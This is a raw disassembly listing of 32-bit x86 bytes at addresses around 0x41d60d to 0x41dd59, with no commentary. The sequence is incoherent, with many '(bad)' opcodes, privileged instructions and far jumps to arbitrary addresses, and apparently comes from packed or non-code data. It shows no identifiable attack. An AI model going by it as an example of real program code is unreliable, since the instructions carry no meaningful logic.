  41d60d:	cmp    dl,BYTE PTR ds:0x57492c76
  41d613:	inc    ebp
  41d614:	shl    BYTE PTR [ecx],0x2f
  41d617:	(bad)  
  41d618:	and    eax,0x3b780cb2
  41d61d:	loopne 0x41d601
  41d61f:	loop   0x41d62a
  41d621:	jmp    0x1be515df
  41d626:	or     eax,0xa7f4fc6a
  41d62b:	pop    ds
  41d62c:	mov    WORD PTR [esp+ecx*8-0x3f],gs
  41d630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d631:	je     0x41d60f
  41d633:	loope  0x41d623
  41d635:	jnp    0x41d682
  41d637:	or     al,0xb5
  41d639:	out    0x73,eax
  41d63b:	xchg   edx,eax
  41d63c:	call   0x2cc6:0xca205c53
  41d643:	mov    dl,BYTE PTR [esi]
  41d645:	xor    al,0xac
  41d647:	fucomi st,st(4)
  41d649:	je     0x41d6aa
  41d64b:	or     BYTE PTR [ebx],ah
  41d64d:	ret    0x10a7
  41d650:	mov    edx,0xb45f7aff
  41d655:	pop    ds
  41d656:	inc    eax
  41d657:	imul   esp,DWORD PTR [ecx+0x5de7893],0xffffff8c
  41d65e:	cmc    
  41d65f:	nop
  41d660:	ja     0x41d612
  41d662:	idiv   DWORD PTR [esi+eax*1+0x57]
  41d666:	mov    dh,0xd7
  41d668:	iret   
  41d669:	or     DWORD PTR [ecx-0x31],esp
  41d66c:	xor    al,0x29
  41d66e:	and    dh,BYTE PTR [edx-0x58097e8c]
  41d674:	inc    eax
  41d675:	int3   
  41d676:	pop    ecx
  41d677:	jbe    0x41d685
  41d679:	xchg   ecx,eax
  41d67a:	fs in  eax,0x46
  41d67d:	iret   
  41d67e:	xchg   edx,eax
  41d67f:	pop    eax
  41d680:	daa    
  41d681:	cmc    
  41d682:	gs dec edi
  41d684:	nop
  41d685:	or     esi,eax
  41d687:	inc    ebp
  41d688:	ds jnp 0x41d6e4
  41d68b:	repz into 
  41d68d:	mov    esi,0xe61090a7
  41d692:	idiv   BYTE PTR [edx-0x58223322]
  41d698:	push   DWORD PTR [edx-0x56]
  41d69b:	repz ja 0x41d693
  41d69e:	pusha  
  41d69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6a0:	dec    edx
  41d6a1:	es xchg esi,eax
  41d6a3:	mov    cl,0xba
  41d6a5:	cmp    eax,0x63c512d4
  41d6aa:	push   edx
  41d6ab:	mov    al,0x8
  41d6ad:	dec    esp
  41d6ae:	lods   eax,DWORD PTR ds:[esi]
  41d6af:	mov    ebp,DWORD PTR [ecx-0x3725edac]
  41d6b5:	dec    esp
  41d6b6:	stos   DWORD PTR es:[edi],eax
  41d6b7:	add    BYTE PTR [ebx+0x261da25c],bh
  41d6bd:	inc    ebp
  41d6be:	inc    eax
  41d6bf:	xchg   ecx,eax
  41d6c0:	scas   eax,DWORD PTR es:[edi]
  41d6c1:	jecxz  0x41d64f
  41d6c3:	fisttp WORD PTR [edi]
  41d6c5:	dec    esp
  41d6c6:	jecxz  0x41d702
  41d6c8:	xchg   ecx,eax
  41d6c9:	push   0x890495a0
  41d6ce:	aam    0x6d
  41d6d0:	inc    edi
  41d6d1:	and    edi,esi
  41d6d3:	xor    DWORD PTR [edx-0x3f],edi
  41d6d6:	xor    al,0x98
  41d6d8:	loope  0x41d6ef
  41d6da:	mov    edi,0xb064a80f
  41d6df:	das    
  41d6e0:	mov    esp,DWORD PTR [ebp-0x4c]
  41d6e3:	push   es
  41d6e4:	jmp    0x41d678
  41d6e6:	mov    al,ds:0xdf126a19
  41d6eb:	sbb    DWORD PTR [edx+eiz*2],edx
  41d6ee:	push   0xcea10642
  41d6f3:	pop    ebx
  41d6f4:	mov    eax,DWORD PTR [edi-0x406f38e8]
  41d6fa:	mov    ecx,0xc369f1eb
  41d6ff:	fs jle 0x41d6b0
  41d702:	(bad)  
  41d703:	(bad)  
  41d704:	out    dx,al
  41d705:	(bad)  
  41d706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d707:	mov    cl,BYTE PTR [ecx]
  41d709:	push   esi
  41d70a:	jae    0x41d6d0
  41d70c:	sbb    eax,0x86e0aeb6
  41d711:	dec    ecx
  41d712:	push   ss
  41d713:	gs xor cl,0x33
  41d717:	adc    al,0xd7
  41d719:	sti    
  41d71a:	inc    edi
  41d71b:	faddp  st(1),st
  41d71d:	ss in  eax,dx
  41d71f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d720:	xchg   esi,ecx
  41d722:	(bad)  
  41d723:	dec    edi
  41d724:	push   esi
  41d725:	shl    BYTE PTR [edi],cl
  41d727:	mov    dl,0xb7
  41d729:	mov    eax,0xa40bb11e
  41d72e:	mov    ecx,0xd0e64a94
  41d733:	jecxz  0x41d6fc
  41d735:	push   edi
  41d736:	xor    al,0xaf
  41d738:	jl     0x41d6cd
  41d73a:	pop    ebp
  41d73b:	(bad)  
  41d73c:	fidiv  DWORD PTR [ebx+0x4c]
  41d73f:	sar    DWORD PTR [edx+0x63],1
  41d742:	ins    DWORD PTR es:[edi],dx
  41d743:	dec    esp
  41d744:	aas    
  41d745:	lods   eax,DWORD PTR ds:[esi]
  41d746:	test   DWORD PTR [esi+0x4f],esi
  41d749:	adc    eax,0x5fe720ad
  41d74e:	xor    BYTE PTR [eax],0x1f
  41d751:	jmp    FWORD PTR [edx]
  41d753:	popa   
  41d754:	mov    eax,0x25b643b8
  41d759:	or     DWORD PTR [edx+0x4b181d10],0x368e4790
  41d763:	outs   dx,DWORD PTR ds:[esi]
  41d764:	jns    0x41d720
  41d766:	mov    ds:0xbf7117e4,al
  41d76b:	push   0x31e6df93
  41d770:	mov    ss,WORD PTR [eax]
  41d772:	mov    edx,gs
  41d774:	outs   dx,DWORD PTR ds:[esi]
  41d775:	inc    edx
  41d776:	ja     0x41d741
  41d778:	sub    cl,dh
  41d77a:	mov    ds:0xbcd14e1e,al
  41d77f:	jle    0x41d7cf
  41d781:	loopne 0x41d780
  41d783:	je     0x41d7dc
  41d785:	scas   al,BYTE PTR es:[edi]
  41d786:	push   0xffffffd5
  41d788:	inc    esi
  41d789:	add    eax,0xd258e995
  41d78e:	es aam 0x2d
  41d791:	inc    edi
  41d792:	ret    0xf864
  41d795:	les    esi,FWORD PTR [esi]
  41d797:	sar    DWORD PTR [eax],cl
  41d799:	rcl    BYTE PTR [edi-0x4],0x25
  41d79d:	ds test al,0x7f
  41d7a0:	mov    bl,0xad
  41d7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7a3:	test   BYTE PTR [ebp-0x255e9715],dh
  41d7a9:	pusha  
  41d7aa:	mov    al,BYTE PTR [edx+0x1e]
  41d7ad:	or     DWORD PTR [esi+edi*4-0x7d2d29be],edi
  41d7b4:	mov    ebx,0x8c5017c5
  41d7b9:	and    eax,0x634c2570
  41d7be:	dec    ebx
  41d7bf:	out    0xb7,al
  41d7c1:	cmp    dh,dh
  41d7c3:	into   
  41d7c4:	mov    eax,ds:0xb813c49e
  41d7c9:	sub    eax,0xbfdd76c8
  41d7ce:	adc    al,bh
  41d7d0:	sub    BYTE PTR [eax-0x34],al
  41d7d3:	ror    BYTE PTR [ebx-0x38],1
  41d7d6:	mov    al,0x28
  41d7d8:	shl    BYTE PTR [eax],1
  41d7da:	fmul   DWORD PTR [eax]
  41d7dc:	mov    edx,edi
  41d7de:	or     DWORD PTR [edx+0x247ea98d],ecx
  41d7e4:	or     eax,0xbb92f065
  41d7e9:	call   0x1413423c
  41d7ee:	mov    ebx,0xe4f9d19
  41d7f3:	xor    BYTE PTR [ecx-0x2b],ah
  41d7f6:	adc    DWORD PTR [esi],esi
  41d7f8:	cmc    
  41d7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7fa:	mov    ch,0x4a
  41d7fc:	inc    DWORD PTR [ecx-0x12]
  41d7ff:	mov    bl,0x6
  41d801:	cli    
  41d802:	inc    ebx
  41d803:	pop    esi
  41d804:	ret    0x16b3
  41d807:	add    al,0x4e
  41d809:	ficom  WORD PTR [ebx-0x46]
  41d80c:	or     ah,dl
  41d80e:	fcomi  st,st(5)
  41d810:	leave  
  41d811:	popa   
  41d812:	sbb    BYTE PTR [edx-0x70],ch
  41d815:	xor    DWORD PTR [ebp+0x62959a0d],0x75
  41d81c:	std    
  41d81d:	inc    edi
  41d81e:	sbb    dh,bl
  41d820:	dec    edi
  41d821:	(bad)
  41d825:	sbb    edi,DWORD PTR [esi]
  41d827:	in     eax,0xd9
  41d829:	adc    eax,0x7dc7e7c1
  41d82e:	ret    
  41d82f:	jle    0x41d839
  41d831:	push   edi
  41d832:	push   ebx
  41d833:	mov    ebp,DWORD PTR [eax+0x59b160e0]
  41d839:	mov    bl,0xc8
  41d83b:	inc    edi
  41d83c:	mov    edx,0x19a20418
  41d841:	mov    edx,0x13ee7ed9
  41d846:	sbb    DWORD PTR [ebp+ebp*8-0x8e327f2],esi
  41d84d:	shl    DWORD PTR [esi],0x3e
  41d850:	iret   
  41d851:	(bad)  
  41d852:	(bad)  
  41d853:	out    0x24,al
  41d855:	or     DWORD PTR [eax],eax
  41d857:	adc    eax,0x1c9ab125
  41d85c:	int3   
  41d85d:	inc    esi
  41d85e:	inc    esi
  41d85f:	gs inc eax
  41d861:	int3   
  41d862:	xor    edx,esp
  41d864:	and    BYTE PTR [esi-0x1c],0x7c
  41d868:	inc    eax
  41d869:	inc    BYTE PTR [edi]
  41d86b:	xor    esp,eax
  41d86d:	dec    edx
  41d86e:	idiv   BYTE PTR [ebp+0x3a7f569a]
  41d874:	inc    edi
  41d875:	dec    esi
  41d876:	mov    bl,0x56
  41d878:	je     0x41d873
  41d87a:	aad    0xf6
  41d87c:	add    cl,dl
  41d87e:	neg    al
  41d880:	xchg   ebp,eax
  41d881:	push   esp
  41d882:	sbb    al,0x10
  41d884:	add    al,0xb7
  41d886:	cwde   
  41d887:	mov    bh,0x3f
  41d889:	out    dx,al
  41d88a:	iret   
  41d88b:	repnz call 0x6b4c:0x535c8fe5
  41d893:	out    0x85,eax
  41d895:	push   esi
  41d896:	xor    bh,BYTE PTR [edx+0x8929946]
  41d89c:	adc    al,0xfe
  41d89e:	les    edi,FWORD PTR [eax]
  41d8a0:	jo     0x41d87f
  41d8a2:	adc    eax,0xb97654fc
  41d8a7:	dec    ebx
  41d8a8:	out    0xda,al
  41d8aa:	add    esp,DWORD PTR [edi+0x7e]
  41d8ad:	dec    BYTE PTR [edi-0xa1c2c9b]
  41d8b3:	and    cl,BYTE PTR [edi]
  41d8b5:	outs   dx,DWORD PTR ds:[esi]
  41d8b6:	cmp    ebp,edi
  41d8b8:	pop    ecx
  41d8b9:	xor    BYTE PTR [edi+0x6f],0x61
  41d8bd:	outs   dx,BYTE PTR ds:[esi]
  41d8be:	aam    0x67
  41d8c0:	sbb    al,0x3a
  41d8c2:	enter  0x2c7d,0xbd
  41d8c6:	cmp    DWORD PTR [ecx],ecx
  41d8c8:	dec    edi
  41d8c9:	cwde   
  41d8ca:	or     al,BYTE PTR [esi+ebx*8]
  41d8cd:	in     eax,dx
  41d8ce:	mov    bh,0x1f
  41d8d0:	add    cl,BYTE PTR [esi+0x774d8fb]
  41d8d6:	mov    si,0x86e7
  41d8da:	sbb    al,0xaf
  41d8dc:	nop
  41d8dd:	cmc    
  41d8de:	pop    eax
  41d8df:	shr    bh,1
  41d8e1:	sub    bl,BYTE PTR [edx-0x3e226d00]
  41d8e7:	adc    DWORD PTR [esi],esp
  41d8e9:	push   ebp
  41d8ea:	mov    ah,0x5b
  41d8ec:	mov    eax,ds:0xe53ebc41
  41d8f1:	hlt    
  41d8f2:	ins    DWORD PTR es:[edi],dx
  41d8f3:	jnp    0x41d90d
  41d8f5:	and    al,0x60
  41d8f7:	aas    
  41d8f8:	ror    BYTE PTR [edi-0x31],0x3b
  41d8fc:	scas   eax,DWORD PTR es:[edi]
  41d8fd:	sbb    eax,0xf3124239
  41d902:	test   al,0x26
  41d904:	sahf   
  41d905:	int3   
  41d906:	xor    al,0xe5
  41d908:	mov    edx,0x7050d513
  41d90d:	or     al,0x29
  41d90f:	enter  0x5b28,0xf3
  41d913:	int    0x81
  41d915:	daa    
  41d916:	inc    edx
  41d917:	mov    esi,0xc71d565d
  41d91c:	je     0x41d95d
  41d91e:	sahf   
  41d91f:	mov    esp,0xb014d663
  41d924:	out    dx,al
  41d925:	xchg   DWORD PTR [ebx+0x56],ecx
  41d928:	pop    es
  41d929:	push   ebp
  41d92a:	imul   ebp,DWORD PTR [esi+0x2c4fbc1d],0x2e
  41d931:	jmp    0xe5d:0xe4f5836c
  41d938:	ja     0x41d90a
  41d93a:	mov    cl,ch
  41d93c:	into   
  41d93d:	data16 int3 
  41d93f:	cwde   
  41d940:	cmp    ebp,esp
  41d942:	jbe    0x41d93f
  41d944:	lods   eax,DWORD PTR cs:[esi]
  41d946:	ins    BYTE PTR es:[edi],dx
  41d947:	fs xchg edx,eax
  41d949:	cmp    bh,cl
  41d94b:	into   
  41d94c:	cmp    BYTE PTR [edx-0x28ecec5a],al
  41d952:	test   BYTE PTR [edi+ebx*8-0x79],bl
  41d956:	push   es
  41d957:	and    al,0x93
  41d959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d95a:	jmp    0x41d9a3
  41d95c:	(bad)  
  41d95d:	into   
  41d95e:	mov    DWORD PTR [ecx-0xd],0xa0e2a302
  41d965:	jnp    0x41d94e
  41d967:	lods   eax,DWORD PTR ds:[esi]
  41d968:	les    ecx,FWORD PTR [ebx]
  41d96a:	leave  
  41d96b:	cmc    
  41d96c:	mov    al,ds:0xe975e1fd
  41d971:	mov    ch,0x84
  41d973:	leave  
  41d974:	aam    0xb4
  41d976:	mov    cl,0x0
  41d978:	mov    dl,0x73
  41d97a:	jg     0x41d97a
  41d97c:	int3   
  41d97d:	shl    BYTE PTR [esp+eax*4+0x1],0x4c
  41d982:	repz sbb BYTE PTR [ecx+eax*4+0x5f23f78c],ah
  41d98a:	adc    eax,0x5a294b79
  41d98f:	cmp    esi,DWORD PTR [eax+0x4adbc66a]
  41d995:	add    DWORD PTR [ebx-0x45d7b303],0xffffff9c
  41d99c:	jno    0x41d9ce
  41d99e:	sti    
  41d99f:	xlat   BYTE PTR ds:[ebx]
  41d9a0:	icebp  
  41d9a1:	clc    
  41d9a2:	leave  
  41d9a3:	mov    esp,0xad504a97
  41d9a8:	bound  ebp,QWORD PTR ds:0xe8174a5c
  41d9ae:	(bad)  
  41d9af:	dec    DWORD PTR [edx-0x43]
  41d9b2:	mov    WORD PTR [ebx+0x6a36a45c],fs
  41d9b8:	push   ds
  41d9b9:	fwait
  41d9ba:	cli    
  41d9bb:	jmp    0xf0cb:0x7ecced6c
  41d9c2:	pop    esp
  41d9c3:	idiv   ebp
  41d9c5:	mov    ds,WORD PTR [ebp-0x1b]
  41d9c8:	ja     0x41da0c
  41d9ca:	int    0xef
  41d9cc:	adc    ch,BYTE PTR [ecx]
  41d9ce:	cmp    BYTE PTR [ecx],dh
  41d9d0:	mov    ds:0xd799f2fc,al
  41d9d5:	dec    ebx
  41d9d6:	push   ecx
  41d9d7:	outs   dx,BYTE PTR ds:[esi]
  41d9d8:	fsub   DWORD PTR [esi]
  41d9da:	aaa    
  41d9db:	cmp    bl,dh
  41d9dd:	mov    ch,BYTE PTR [ebp-0x44]
  41d9e0:	xor    al,0x8e
  41d9e2:	fcomp  DWORD PTR [ebx+eax*2-0x70]
  41d9e6:	retf   0x70d1
  41d9e9:	out    0x75,al
  41d9eb:	gs daa 
  41d9ed:	push   ss
  41d9ee:	ficomp WORD PTR [edi+0x34]
  41d9f1:	pop    edx
  41d9f2:	popa   
  41d9f3:	rol    edi,0xa1
  41d9f6:	pushw  0x45a1
  41d9fa:	mov    bh,0xff
  41d9fc:	sahf   
  41d9fd:	add    ah,BYTE PTR [ebx-0x6939f2f0]
  41da03:	(bad)  
  41da04:	xchg   ecx,eax
  41da05:	xor    ebx,0xffffffe1
  41da08:	mov    ch,0xbe
  41da0a:	jno    0x41da35
  41da0c:	or     DWORD PTR [ecx+0x74902134],0xfec62279
  41da16:	push   eax
  41da17:	cli    
  41da18:	daa    
  41da19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da1a:	das    
  41da1b:	mov    ch,0x29
  41da1d:	out    dx,eax
  41da1e:	imul   ebp,DWORD PTR [ebp-0x2a],0x30b35493
  41da25:	mul    DWORD PTR [ebx+0x20]
  41da28:	or     al,BYTE PTR [edx-0x5c]
  41da2b:	dec    ebp
  41da2c:	or     DWORD PTR [ecx+0x18],0xfffffff9
  41da30:	cmp    DWORD PTR [ebx+0xe],ecx
  41da33:	gs push ss
  41da35:	sbb    al,0x4
  41da37:	cmp    ah,bl
  41da39:	push   0x19
  41da3b:	test   eax,0xa80985e3
  41da40:	jge    0x41da43
  41da42:	xor    esi,eax
  41da44:	(bad)  
  41da45:	fidivr DWORD PTR [edx+0x6cd3b78b]
  41da4b:	cmp    edi,edi
  41da4d:	sbb    bh,BYTE PTR [edx]
  41da4f:	call   0x3985:0xcca03b5f
  41da56:	popa   
  41da57:	mov    esi,0xf8fdb40a
  41da5c:	fcmovb st,st(7)
  41da5e:	loopne 0x41d9fe
  41da60:	cmp    esp,DWORD PTR [ebx+0x61]
  41da63:	sub    edi,DWORD PTR [ebx+eiz*2-0xc]
  41da67:	add    al,0x99
  41da69:	mov    cl,0xd3
  41da6b:	cli    
  41da6c:	cs jnp 0x41da88
  41da6f:	xchg   ecx,eax
  41da70:	mov    ebp,0x1680996c
  41da75:	jb     0x41dae5
  41da77:	jmp    0xd2214a89
  41da7c:	sbb    edi,DWORD PTR [eax-0x40]
  41da7f:	mov    al,0x74
  41da81:	scas   al,BYTE PTR es:[edi]
  41da82:	test   al,0x95
  41da84:	scas   eax,DWORD PTR es:[edi]
  41da85:	xchg   edx,eax
  41da86:	div    BYTE PTR [ebp+0x5c46b53c]
  41da8c:	mov    al,ds:0x771e8ac4
  41da91:	loopne 0x41da70
  41da93:	fadd   QWORD PTR [eax]
  41da95:	push   es
  41da96:	out    0xba,al
  41da98:	add    eax,0xbc777191
  41da9d:	sub    al,0x4
  41da9f:	out    dx,al
  41daa0:	mov    bh,0x75
  41daa2:	pop    ebp
  41daa3:	imul   edx,edx,0xffffff9e
  41daa6:	pop    ss
  41daa7:	push   edi
  41daa8:	ds pop esi
  41daaa:	and    BYTE PTR [edx+eiz*4],dh
  41daad:	loope  0x41dad7
  41daaf:	pop    eax
  41dab0:	or     esp,DWORD PTR [edx+eiz*1]
  41dab3:	and    dl,bl
  41dab5:	jno    0x41db33
  41dab7:	mov    ebx,0xf0008e87
  41dabc:	iret   
  41dabd:	xchg   BYTE PTR [eax-0x19],dh
  41dac0:	mov    cl,BYTE PTR [edi+0x7bdddcc2]
  41dac6:	push   eax
  41dac7:	mov    eax,ds:0x8fadab78
  41dacc:	ret    0xa4f8
  41dacf:	setae  BYTE PTR [edx+0x4822f3db]
  41dad6:	(bad)  
  41dad7:	pop    ebx
  41dad8:	and    al,0x9a
  41dada:	idiv   BYTE PTR [edx+0x71]
  41dadd:	sub    BYTE PTR [esi-0x31],ah
  41dae0:	add    eax,0xd2b76b2e
  41dae5:	fcmovb st,st(6)
  41dae7:	sub    esp,DWORD PTR [ebx+0x16]
  41daea:	xchg   ebp,eax
  41daeb:	inc    edx
  41daec:	mov    eax,0xc4560fc6
  41daf1:	dec    esp
  41daf2:	gs je  0x41dab9
  41daf5:	les    edx,FWORD PTR [ecx-0x639909af]
  41dafb:	jg     0x41dad8
  41dafd:	add    DWORD PTR [edx+0x3a5cebb7],edi
  41db03:	hlt    
  41db04:	add    dh,BYTE PTR [edi]
  41db06:	mov    cl,0x19
  41db08:	mov    cl,0xfd
  41db0a:	or     DWORD PTR [eax-0x742f55e],eax
  41db10:	rcr    DWORD PTR [ebp-0x3ead974b],0xd1
  41db17:	ins    DWORD PTR es:[edi],dx
  41db18:	fld    TBYTE PTR [eax-0xf]
  41db1b:	popa   
  41db1c:	mov    ah,BYTE PTR [ebp+0x5e]
  41db1f:	and    eax,0x742b0b51
  41db24:	and    ch,ch
  41db26:	repnz push edi
  41db28:	cdq    
  41db29:	adc    esi,DWORD PTR [eax]
  41db2b:	dec    ebp
  41db2c:	cld    
  41db2d:	jno    0x41db29
  41db2f:	loope  0x41dba6
  41db31:	add    BYTE PTR [eax+0x20d4c63e],ah
  41db37:	cmp    al,0xd0
  41db39:	pusha  
  41db3a:	jmp    0x41dabe
  41db3c:	adc    dl,BYTE PTR [ebx]
  41db3e:	push   0xc0242427
  41db43:	or     eax,DWORD PTR [edx+ebp*1+0x68d1f466]
  41db4a:	repz sahf 
  41db4c:	mov    eax,0x6edc673f
  41db51:	inc    edx
  41db52:	fadd   DWORD PTR [edx]
  41db54:	mov    edx,0x46407d5e
  41db59:	push   esi
  41db5a:	out    0x6,eax
  41db5c:	sub    ecx,DWORD PTR [edi-0x24]
  41db5f:	xchg   ch,ch
  41db61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db62:	sti    
  41db63:	jle    0x41dba8
  41db65:	pushf  
  41db66:	test   al,0xab
  41db68:	inc    edx
  41db69:	in     eax,0x21
  41db6b:	rcr    DWORD PTR [ebx],1
  41db6d:	scas   al,BYTE PTR es:[edi]
  41db6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db6f:	cdq    
  41db70:	lahf   
  41db71:	xor    edx,DWORD PTR [edx+0x54ce5b5b]
  41db77:	pop    ss
  41db78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db79:	iret   
  41db7a:	push   esp
  41db7b:	push   esp
  41db7c:	lahf   
  41db7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db7e:	(bad)  
  41db7f:	sti    
  41db80:	or     eax,0x607323e4
  41db85:	ds mov bh,0x26
  41db88:	xchg   edx,eax
  41db89:	retf   0x91eb
  41db8c:	das    
  41db8d:	and    DWORD PTR ds:0x2b125380,esi
  41db93:	rcr    edi,cl
  41db95:	aas    
  41db96:	jnp    0x41dbfd
  41db98:	and    al,0x75
  41db9a:	push   esp
  41db9b:	leave  
  41db9c:	adc    BYTE PTR [edx-0x3b83d017],dl
  41dba2:	xchg   ebp,eax
  41dba3:	sbb    al,0xd5
  41dba5:	les    ecx,FWORD PTR [esi+0x61]
  41dba8:	lock call 0xfb56:0x40513c2e
  41dbb0:	popf   
  41dbb1:	and    DWORD PTR [ecx],0x68
  41dbb4:	adc    al,0x42
  41dbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb7:	mov    ds:0x9942d70,al
  41dbbc:	mov    ecx,0x65edac6d
  41dbc1:	in     eax,dx
  41dbc2:	fbld   TBYTE PTR [esi-0x6710f69a]
  41dbc8:	xchg   ebx,eax
  41dbc9:	add    BYTE PTR [edx],cl
  41dbcb:	(bad)  
  41dbcc:	(bad)  [edx+0x4f]
  41dbcf:	ret    
  41dbd0:	push   edi
  41dbd1:	sbb    esp,DWORD PTR [edi+0x3572c3df]
  41dbd7:	fcmovu st,st(3)
  41dbd9:	into   
  41dbda:	ss adc al,0x50
  41dbdd:	scas   eax,DWORD PTR es:[edi]
  41dbde:	mov    WORD PTR ds:0x81a3f93d,ss
  41dbe4:	push   DWORD PTR [eax+ebp*8]
  41dbe7:	sub    BYTE PTR [ebx-0x2a],ah
  41dbea:	xchg   ebx,eax
  41dbeb:	jl     0x41dc18
  41dbed:	nop
  41dbee:	inc    eax
  41dbef:	and    eax,0xb8d2c9a9
  41dbf4:	mov    ebp,0x85e59a62
  41dbf9:	sub    al,0xa4
  41dbfb:	scas   eax,DWORD PTR es:[edi]
  41dbfc:	cmp    eax,0x3c8aa7da
  41dc01:	mov    cl,0x79
  41dc03:	popa   
  41dc04:	ins    DWORD PTR es:[edi],dx
  41dc05:	enter  0x1b1a,0x39
  41dc09:	sub    al,0x9
  41dc0b:	test   cl,dh
  41dc0d:	outs   dx,BYTE PTR ds:[esi]
  41dc0e:	call   DWORD PTR [ebx]
  41dc10:	push   ss
  41dc11:	lock jl 0x41dbe2
  41dc14:	and    BYTE PTR [esi+0x51],dl
  41dc17:	mov    ds:0x4b8eb3f0,al
  41dc1c:	inc    ebx
  41dc1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc1e:	js     0x41dc2b
  41dc20:	pop    ss
  41dc21:	(bad)  
  41dc22:	cmp    DWORD PTR [edi-0x27],ecx
  41dc25:	sbb    DWORD PTR [ecx+0x3c78f7a5],eax
  41dc2b:	pop    ebx
  41dc2c:	mov    ecx,0xcc728b4c
  41dc31:	sub    al,0xc3
  41dc33:	ds inc edi
  41dc35:	pop    ebx
  41dc36:	out    0x68,eax
  41dc38:	popa   
  41dc39:	in     eax,dx
  41dc3a:	imul   ebx,DWORD PTR [edi+eax*2],0xde4b7ec1
  41dc41:	sub    ah,BYTE PTR [ebp-0x18c052ec]
  41dc47:	and    ah,ah
  41dc49:	fnsave [ebp-0x16]
  41dc4c:	or     BYTE PTR [eax],dh
  41dc4e:	xchg   ecx,eax
  41dc4f:	inc    eax
  41dc50:	mov    ss,WORD PTR [esi+ebp*2+0x3316d1a9]
  41dc57:	xchg   BYTE PTR [eax-0x11],bl
  41dc5a:	inc    edx
  41dc5b:	fisub  WORD PTR [ebx-0xeeee640]
  41dc61:	push   esi
  41dc62:	imul   BYTE PTR [ebp+ebp*2-0x7e9afe48]
  41dc69:	rcr    DWORD PTR [edx-0x33],0x85
  41dc6d:	xchg   esi,eax
  41dc6e:	rcl    DWORD PTR [edx-0x3795e070],cl
  41dc74:	mov    edx,0xcc2e47d
  41dc79:	fld    QWORD PTR [esi]
  41dc7b:	div    BYTE PTR ds:[edi]
  41dc7e:	push   esi
  41dc7f:	dec    esp
  41dc80:	jno    0x41dc75
  41dc82:	int3   
  41dc83:	scas   al,BYTE PTR es:[edi]
  41dc84:	pop    esi
  41dc85:	js     0x41dc51
  41dc87:	test   al,0xdf
  41dc89:	cmp    al,0x3d
  41dc8b:	fwait
  41dc8c:	in     eax,dx
  41dc8d:	nop
  41dc8e:	icebp  
  41dc8f:	(bad)  
  41dc90:	fldcw  WORD PTR [edx+0x281fa27f]
  41dc96:	inc    esp
  41dc97:	add    eax,0x88a34823
  41dc9c:	jle    0x41dcec
  41dc9e:	inc    ecx
  41dc9f:	sub    ch,BYTE PTR [ecx+0x57]
  41dca2:	popa   
  41dca3:	sbb    al,ah
  41dca5:	xor    eax,0x9b0ea190
  41dcaa:	sbb    eax,0xab780679
  41dcaf:	ins    DWORD PTR es:[edi],dx
  41dcb0:	div    BYTE PTR [ecx+eax*8]
  41dcb3:	hlt    
  41dcb4:	mov    eax,0x23ba7ef1
  41dcb9:	lods   eax,DWORD PTR fs:[esi]
  41dcbb:	dec    esi
  41dcbc:	repz jbe 0x41dcb2
  41dcbf:	jp     0x41dca1
  41dcc1:	inc    eax
  41dcc2:	push   0xfffffffc
  41dcc4:	mov    ah,0x91
  41dcc6:	sahf   
  41dcc7:	shr    BYTE PTR [edi],0xe4
  41dcca:	inc    edi
  41dccb:	add    DWORD PTR [esi+esi*2+0x7d],eax
  41dccf:	je     0x41dd12
  41dcd1:	inc    eax
  41dcd2:	es aas 
  41dcd4:	int    0x20
  41dcd6:	loope  0x41dd0c
  41dcd8:	(bad)  
  41dcd9:	add    al,0xe7
  41dcdb:	es push 0xffffffa4
  41dcde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcdf:	hlt    
  41dce0:	cld    
  41dce1:	js     0x41dd0a
  41dce3:	or     eax,edi
  41dce5:	fs jnp 0x41dcfb
  41dce8:	xor    BYTE PTR [esi+0x6e],al
  41dceb:	shl    BYTE PTR [edi],cl
  41dced:	mov    ds:0xdac18645,al
  41dcf2:	ins    BYTE PTR es:[edi],dx
  41dcf3:	lahf   
  41dcf4:	inc    eax
  41dcf5:	push   edx
  41dcf6:	scas   eax,DWORD PTR es:[edi]
  41dcf7:	pop    esp
  41dcf8:	jb     0x41dc7a
  41dcfa:	jle    0x41dd0d
  41dcfc:	dec    eax
  41dcfd:	push   es
  41dcfe:	add    esp,esi
  41dd00:	sub    eax,0xe5eb1d99
  41dd05:	ins    BYTE PTR es:[edi],dx
  41dd06:	push   ds
  41dd07:	fsubr  QWORD PTR [edx+eiz*2-0x4e30f43e]
  41dd0e:	xor    BYTE PTR [ebx],dl
  41dd10:	jle    0x41dd30
  41dd12:	in     al,dx
  41dd13:	jmp    0x379b:0x8a61afb3
  41dd1a:	jl     0x41dd78
  41dd1c:	inc    eax
  41dd1d:	add    bh,BYTE PTR [ecx]
  41dd1f:	mov    al,0xb
  41dd21:	aas    
  41dd22:	(bad)  
  41dd23:	stc    
  41dd24:	and    cl,BYTE PTR [ebp-0x69e78ae1]
  41dd2a:	mov    dh,0xfb
  41dd2c:	bts    ebp,esi
  41dd2f:	lods   al,BYTE PTR ds:[esi]
  41dd30:	retf   0x7842
  41dd33:	and    edx,DWORD PTR [bp+0x63]
  41dd37:	daa    
  41dd38:	inc    esp
  41dd39:	adc    ebp,edx
  41dd3b:	sbb    bh,BYTE PTR [eax]
  41dd3d:	jp     0x41dd48
  41dd3f:	or     bl,BYTE PTR [eax-0x6]
  41dd42:	xchg   dl,dh
  41dd44:	inc    edx
  41dd45:	jnp    0x41dcd1
  41dd47:	adc    esi,esp
  41dd49:	fwait
  41dd4a:	cmp    DWORD PTR [esi],0xf2c4f94e
  41dd50:	xchg   esp,eax
  41dd51:	jne    0x41dcfe
  41dd53:	cli    
  41dd54:	mov    edi,0xba28c2ea
  41dd59:	scas   eax,DWORD PTR es:[edi]
